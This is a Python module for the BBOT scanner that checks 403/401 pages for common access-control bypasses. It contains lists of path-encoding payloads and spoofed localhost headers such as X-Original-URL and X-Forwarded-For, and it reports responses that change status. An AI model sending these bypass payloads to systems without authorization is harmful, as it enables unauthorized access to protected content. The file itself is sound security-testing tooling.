from bbot.modules.base import BaseModule
from bbot.core.errors import HttpCompareError

"""
Port of https://github.com/iamj0ker/bypass-403/ and https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122
"""

# ([string]method,[string]path,[dictionary]header,[bool]strip trailing slash)
signatures = [
    ("GET", "{scheme}://{netloc}/%2e/{path}", None, False),
    ("GET", "{scheme}://{netloc}/{path}", {"X-Original-URL": "{path}"}, False),
    ("GET", "{scheme}://{netloc}/{path}", {"X-Forwarded-For": "http://127.0.0.1"}, False),
    ("GET", "{scheme}://{netloc}/{path}", {"X-rewrite-url": "nonsense"}, False),
    ("GET", "{scheme}://{netloc}/{path}.html", None, False),
    ("GET", "{scheme}://{netloc}/{path}#", None, False),
    ("POST", "{scheme}://{netloc}/{path}", {"Content-Length": "0"}, False),
    ("GET", "{scheme}://{netloc}/{path}.php", None, False),
    ("GET", "{scheme}://{netloc}/{path}.json", None, False),
    ("TRACE", "{scheme}://{netloc}/{path}", None, True),
]

query_payloads = [
    "%09",
    "%20",
    "%23",
    "%2e",
    "%2f",
    ".",
    "?",
    ";",
    "..;",
    ";%09",
    ";%09..",
    ";%09..;",
    ";%2f..",
    "*",
    "/*",
    "..;/",
    ";/",
    "/..;/",
    "/;/",
    "/./",
    "//",
    "/.",
    "/?anything",
]

header_payloads = {
    "Client-IP": "127.0.0.1",
    "X-Real-Ip": "127.0.0.1",
    "Redirect": "127.0.0.1",
    "Referer": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-By": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1",
    "X-Forwarded-Port": "80",
    "X-True-IP": "127.0.0.1",
    "X-Host": "127.0.0.1",
}

for qp in query_payloads:
    signatures.append(("GET", "{scheme}://{netloc}/{path}%s" % qp, None, True))
    if "?" not in qp:  # we only want to use "?" after the path
        signatures.append(("GET", "{scheme}://{netloc}/%s/{path}" % qp, None, True))

for hp_key in header_payloads.keys():
    signatures.append(("GET", "{scheme}://{netloc}/{path}", {hp_key: header_payloads[hp_key]}, False))


class bypass403(BaseModule):
    watched_events = ["URL"]
    produced_events = ["FINDING"]
    flags = ["active", "aggressive", "web-advanced"]
    meta = {"description": "Check 403 pages for common bypasses"}
    in_scope_only = True

    def handle_event(self, event):
        try:
            compare_helper = self.helpers.http_compare(event.data, allow_redirects=True)
        except HttpCompareError as e:
            self.debug(e)
            return

        for sig in signatures:
            sig = self.format_signature(sig, event)
            if sig[2] != None:
                headers = dict(sig[2])
            else:
                headers = None
            match, reasons, reflection, subject_response = compare_helper.compare(
                sig[1], headers=headers, method=sig[0], allow_redirects=True
            )

            if match == False:
                if str(subject_response.status_code)[0] != "4":
                    if sig[2]:
                        added_header_tuple = next(iter(sig[2].items()))
                        reported_signature = f"Added Header: {added_header_tuple[0]}: {added_header_tuple[1]}"
                    else:
                        reported_signature = f"Modified URL: {sig[0]} {sig[1]}"
                    description = f"403 Bypass Reasons: [{','.join(reasons)}] Sig: [{reported_signature}]"
                    self.emit_event(
                        {"description": description, "host": str(event.host), "url": event.data},
                        "FINDING",
                        source=event,
                    )
                else:
                    self.debug(f"Status code changed to {str(subject_response.status_code)}, ignoring")

    def filter_event(self, event):
        if ("status-403" in event.tags) or ("status-401" in event.tags):
            return True
        return False

    def format_signature(self, sig, event):
        if sig[3] == True:
            cleaned_path = event.parsed.path.strip("/")
        else:
            cleaned_path = event.parsed.path.lstrip("/")
        kwargs = {"scheme": event.parsed.scheme, "netloc": event.parsed.netloc, "path": cleaned_path}
        formatted_url = sig[1].format(**kwargs)
        if sig[2] != None:
            formatted_headers = {k: v.format(**kwargs) for k, v in sig[2].items()}
        else:
            formatted_headers = None
        return (sig[0], formatted_url, formatted_headers)
